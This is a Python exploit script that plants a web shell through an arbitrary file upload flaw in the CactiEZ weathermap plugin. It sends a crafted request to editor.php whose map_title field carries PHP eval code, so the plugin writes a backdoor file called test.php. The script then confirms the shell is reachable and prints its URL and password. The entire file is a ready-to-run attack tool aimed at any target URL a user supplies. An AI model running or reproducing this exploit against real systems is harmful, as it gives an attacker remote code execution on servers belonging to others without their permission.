#!/usr/bin/env python
#-*- coding:utf-8 -*-
#CactiEZ weathermap plugin arbitary file upload and getshell
__author__ = '@S4kur4'

import requests
import sys
import optparse

plugin_url = r"/plugins/weathermap/editor.php?plug=0&mapname=test.php&action=set_map_properties&"\
             r"param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_labe"\
             r"l=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth"\
             r"_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_t"\
             r"itle=<?php echo(md5(1));@eval($_POST['wooyun']);?>&map_legend=Traffic+Load&map_st"\
             r"amp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7&map_linkdefaultbwin=100M&ma"\
             r"p_linkdefaultbwout=100M&map_width=800&map_height=600&map_pngfile=&map_htmlfile=&m"\
             r"ap_bgfile=--NONE--&mapstyle_linklabels=percent&mapstyle_htmlstyle=overlib&mapstyl"\
             r"e_arrowstyle=classic&mapstyle_nodefont=3&mapstyle_linkfont=2&mapstyle_legendfont="\
             r"4&item_configtext=Name"

def main():
	parser = optparse.OptionParser('Usage: %prog [options]\nExample:python %prog -u http://www.test.com')
	parser.add_option('-u', '--url', dest='target_hosturl', type='string', help='specify target hosturl')
	(options, args) = parser.parse_args()
	if options.target_hosturl==None:
		parser.print_help()
		sys.exit(0)
	else:
		target_hosturl = options.target_hosturl
		exploit_url = target_hosturl.rstrip('/') + plugin_url
		webshell_url = target_hosturl.rstrip('/') + '/plugins/weathermap/configs/test.php'
	try:
		print "\033[1;32m[+] Exploit...\033[0m"
		request = requests.get(url=exploit_url)
		verify_request = requests.get(url=webshell_url)
		if request.status_code!=200 or verify_request.status_code!=200:
			print "\033[1;31m[-] Exploit response status code:\033[1;33m {}\033[1;31m\n[-] Webshell response status code:\033[1;33m {}\033[0m".format(request.status_code, verify_request.status_code)
			print "\033[1;31m[-] Unsuccessful, maybe the site is not vulnerable :-(\033[0m"
		else:
			print "\033[1;32m[+] Exploit response status code:\033[1;33m {}\033[1;32m\n[+] Webshell response status code:\033[1;33m {}\033[0m".format(request.status_code, verify_request.status_code)
			print "\033[1;32m[+] Success! The webshell is \033[1;33m'{}'\033[1;32m, password is \033[1;33m'wooyun'\033[0m".format(webshell_url)
	except Exception as e:
		pass
	
if __name__ == '__main__':
	main()